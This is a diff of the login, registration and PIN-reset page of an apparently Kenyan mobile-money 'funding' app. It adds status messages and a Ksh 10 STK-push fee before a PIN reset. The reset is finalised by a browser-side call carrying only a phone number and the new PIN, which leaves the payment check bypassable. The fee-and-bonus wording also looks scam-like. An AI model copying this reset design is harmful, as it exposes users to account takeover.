@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,7 +5,7 @@
     <title>M-Ledger Login & Security</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        :root { --primary: #4CAF50; --dark: #0f0f0f; --card: #1a1a1a; }
+        :root { --primary: #4CAF50; --dark: #0f0f0f; --card: #1a1a1a; --error: #ff4444; --warning: #ffab00; }
         body { font-family: system-ui, -apple-system, sans-serif; background: var(--dark); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
         .box { width: 100%; max-width: 400px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: var(--primary); box-sizing: border-box; font-size: 16px; }
@@ -17,14 +15,15 @@
         .link { text-align: center; margin-top: 15px; color: #888; cursor: pointer; text-decoration: underline; font-size: 14px; }
         h2 { text-align: center; margin-top: 0; color: var(--primary); }
         p.info { text-align: center; font-size: 13px; color: #aaa; margin-bottom: 20px; }
-        #status { text-align: center; margin-top: 15px; font-weight: 500; min-height: 40px; font-size: 14px; }
+        #status { text-align: center; margin-top: 15px; font-weight: bold; min-height: 40px; font-size: 15px; padding: 10px; border-radius: 8px; }
         .loader { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; margin-right: 8px; }
-        .choice-container { display: none; flex-direction: column; gap: 12px; margin-top: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="box">
+        <div id="status"></div>
+
         <div id="loginSection">
             <h2>M-Ledger Login</h2>
             <p class="info">Use your Safaricom number for easy funding.</p>
@@ -35,44 +34,46 @@
             <p class="link" style="color: #ffab00;" onclick="showSection('resetSection')">Forgot PIN / Change Password?</p>
         </div>
 
-        <!-- New: post-login choice screen -->
         <div id="choiceSection" style="display:none">
-            <h2>Welcome Back!</h2>
+            <h2>Success!</h2>
             <p class="info">How would you like to continue?</p>
-            <div class="choice-container" style="display:block;">
-                <button onclick="goTo('menu.html')">Continue with App</button>
-                <button onclick="goTo('act.html')">Continue with SIM Toolkit</button>
-                <pr> 🏝️ 🌄🎇 🎆🌆🌇🌌 🌁🌅🌅♨️🚤 💭🗯️💬<br>
-                    Offer! Offer! Funding account has been deducted from 15% to 4%.
-                    Fund 1000 bob today and get free  bonus up to 500 bob!Fund to claim your bonus!
-                </pr>
-                
+            <button onclick="goTo('menu.html')">Continue with App</button>
+            <button onclick="goTo('act.html')" style="background: #333; margin-top: 15px;">Continue with SIM Toolkit</button>
+            <div style="margin-top: 20px; font-size: 12px; color: #888; text-align: center; line-height: 1.5;">
+                Offer! Funding fee reduced to 4%.<br>Fund 1000/= and get 500/= bonus!
             </div>
-            <p id="status"></p>
         </div>
-       
+        
         <div id="regSection" style="display:none">
             <h2>Create Account</h2>
             <input id="rName" placeholder="Full Name">
             <input id="rPhone" placeholder="Safaricom Phone Number" type="tel">
             <input id="rPass" type="password" placeholder="Set PIN/Password">
-            <button id="rBtn" onclick="register()">Register</button>
+            <button id="rBtn" onclick="register()">Register Now</button>
             <p class="link" onclick="showSection('loginSection')">Back to Login</p>
         </div>
+
         <div id="resetSection" style="display:none">
             <h2>Reset PIN</h2>
-            <p class="info">A <strong>Ksh 10.00</strong> verification fee is required to confirm account ownership.</p>
+            <p class="info">A <strong>Ksh 10.00</strong> verification fee is required.</p>
             <input id="resetPhone" placeholder="Registered Phone Number" type="tel">
             <input id="resetPass" type="password" placeholder="Enter New PIN">
             <button id="resetBtn" onclick="changePin()">Verify & Update PIN</button>
             <p class="link" onclick="showSection('loginSection')">Back to Login</p>
         </div>
-        <p id="status"></p>
     </div>
 
     <script>
         const API = "https://funds-mauve.vercel.app/api";
         const BACKEND_PAYMENT = "https://newpayment-srpu.onrender.com";
+
+        function setStatus(msg, type) {
+            const status = document.getElementById('status');
+            status.innerText = msg;
+            if (type === 'success') status.style.color = "#4CAF50";
+            else if (type === 'error') status.style.color = "#ff4444";
+            else status.style.color = "#ffab00";
+        }
 
         function showSection(sectionId) {
             const sections = ['loginSection', 'regSection', 'resetSection', 'choiceSection'];
@@ -82,17 +83,16 @@
             document.getElementById('status').innerText = "";
         }
 
-        function goTo(page) {
-            window.location.href = page;
-        }
+        function goTo(page) { window.location.href = page; }
 
         async function login() {
             const btn = document.getElementById('lBtn');
-            const status = document.getElementById('status');
             const phone = document.getElementById('lPhone').value;
             const pass = document.getElementById('lPass').value;
 
-            btn.innerText = "Logging in...";
+            if(!phone || !pass) return setStatus("Please enter phone and PIN", "error");
+
+            btn.innerHTML = '<span class="loader"></span> Logging in...';
             btn.disabled = true;
 
             try {
@@ -102,22 +102,18 @@
                     body: JSON.stringify({ phone, password: pass })
                 });
                 const d = await res.json();
-               
+                
                 if (d.success) {
-                    status.style.color = "#4CAF50";
-                    status.innerText = "Success! Choose your access method...";
+                    setStatus("Login Successful!", "success");
                     localStorage.setItem('mledger_user', JSON.stringify(d.user));
-                    
-                    // Instead of direct redirect → show choice
-                    showSection('choiceSection');
+                    setTimeout(() => showSection('choiceSection'), 1000);
                 } else {
-                    status.style.color = "#ffab00";
-                    status.innerText = d.error || "Login failed";
+                    setStatus(d.error || "Login Failed: Incorrect details", "error");
                     btn.innerText = "Login";
                     btn.disabled = false;
                 }
             } catch (err) {
-                status.innerText = "Connection failed.";
+                setStatus("Connection Error. Try again.", "error");
                 btn.disabled = false;
                 btn.innerText = "Login";
             }
@@ -125,48 +121,49 @@
 
         async function register() {
             const btn = document.getElementById('rBtn');
-            const status = document.getElementById('status');
-           
-            btn.innerText = "Creating Account...";
+            const name = document.getElementById('rName').value;
+            const phone = document.getElementById('rPhone').value;
+            const pass = document.getElementById('rPass').value;
+
+            if(!name || !phone || !pass) return setStatus("Fill all fields to register", "error");
+
+            btn.innerHTML = '<span class="loader"></span> Creating Account...';
             btn.disabled = true;
+
             try {
                 const res = await fetch(`${API}/register`, {
                     method:'POST',
                     headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({
-                        name: document.getElementById('rName').value,
-                        phone: document.getElementById('rPhone').value,
-                        password: document.getElementById('rPass').value
-                    })
+                    body: JSON.stringify({ name, phone, password: pass })
                 });
                 const d = await res.json();
-                status.innerText = d.message || d.error;
-                if(d.message) setTimeout(() => showSection('loginSection'), 1500);
+                
+                if(res.ok || d.message) {
+                    setStatus("Success! Account Created.", "success");
+                    setTimeout(() => showSection('loginSection'), 2000);
+                } else {
+                    setStatus(d.error || "Registration Failed", "error");
+                }
             } catch (err) {
-                status.innerText = "Registration failed.";
+                setStatus("Network error during registration", "error");
             } finally {
-                btn.innerText = "Register";
+                btn.innerText = "Register Now";
                 btn.disabled = false;
             }
         }
 
-        // --- NEW SECURITY FEATURE: CHANGE PIN WITH STK VERIFICATION ---
         async function changePin() {
             const btn = document.getElementById('resetBtn');
-            const status = document.getElementById('status');
             const phone = document.getElementById('resetPhone').value;
             const newPassword = document.getElementById('resetPass').value;
-            if(!phone || !newPassword) {
-                status.style.color = "#ffab00";
-                status.innerText = "Please fill all fields";
-                return;
-            }
-            btn.innerHTML = '<span class="loader"></span>Verifying Ownership...';
+
+            if(!phone || !newPassword) return setStatus("Phone and New PIN required", "error");
+
+            btn.innerHTML = '<span class="loader"></span> Initiating...';
             btn.disabled = true;
-            status.style.color = "#aaa";
-            status.innerText = "Requesting STK Push of Ksh 10...";
+            setStatus("Sending STK Push to your phone...", "warning");
+
             try {
-                // 1. Trigger STK Push for 10 Bob
                 const payRes = await fetch(`${BACKEND_PAYMENT}/api/initiate`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -174,22 +171,21 @@
                 });
                 const payData = await payRes.json();
                 const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
+
                 if (invoiceId) {
-                    status.innerText = "Enter M-Pesa PIN on your phone to confirm you own this account.";
+                    setStatus("Complete M-Pesa payment to verify", "warning");
                     startPollingReset(invoiceId, phone, newPassword);
                 } else {
-                    throw new Error("STK push failed.");
+                    throw new Error();
                 }
             } catch (err) {
-                status.style.color = "#ffab00";
-                status.innerText = "Could not reach payment gateway,check your number if is a safaricom line.";
+                setStatus("Error: Use a valid Safaricom line", "error");
                 btn.disabled = false;
                 btn.innerText = "Verify & Update PIN";
             }
         }
 
         function startPollingReset(invoiceId, phone, newPassword) {
-            const status = document.getElementById('status');
             const btn = document.getElementById('resetBtn');
             let pollCount = 0;
             const pollTimer = setInterval(async () => {
@@ -198,15 +194,14 @@
                     const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
                     const data = await res.json();
                     const state = data.invoice ? data.invoice.state : data.state;
+
                     if (state === "COMPLETE" || state === "COMPLETED") {
                         clearInterval(pollTimer);
-                        status.style.color = "#4CAF50";
-                        status.innerText = "Ownership Verified! Updating PIN...";
+                        setStatus("Verification Success!", "success");
                         finalizePinUpdate(phone, newPassword);
                     } else if (state === "FAILED" || state === "REJECTED" || pollCount > 20) {
                         clearInterval(pollTimer);
-                        status.style.color = "#ff4444";
-                        status.innerText = "First make sure you own the account (Verification Failed).";
+                        setStatus("Verification Failed. Try again.", "error");
                         btn.disabled = false;
                         btn.innerText = "Verify & Update PIN";
                     }
@@ -215,29 +210,21 @@
         }
 
         async function finalizePinUpdate(phone, newPassword) {
-            const status = document.getElementById('status');
-            const btn = document.getElementById('resetBtn');
             try {
                 const res = await fetch(`${API}/reset-pin`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone, newPassword })
                 });
-               
+                
                 if (res.ok) {
-                    status.style.color = "#4CAF50";
-                    status.innerText = "✅ PIN updated successfully! Redirecting...";
+                    setStatus("Success! PIN has been updated.", "success");
                     setTimeout(() => showSection('loginSection'), 2000);
                 } else {
-                    const d = await res.json();
-                    status.style.color = "#ffab00";
-                    status.innerText = d.error || "Update failed. Contact support.";
+                    setStatus("Update failed. Phone not found.", "error");
                 }
             } catch (err) {
-                status.innerText = "Database connection error.";
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "Verify & Update PIN";
+                setStatus("Database error.", "error");
             }
         }
     </script>
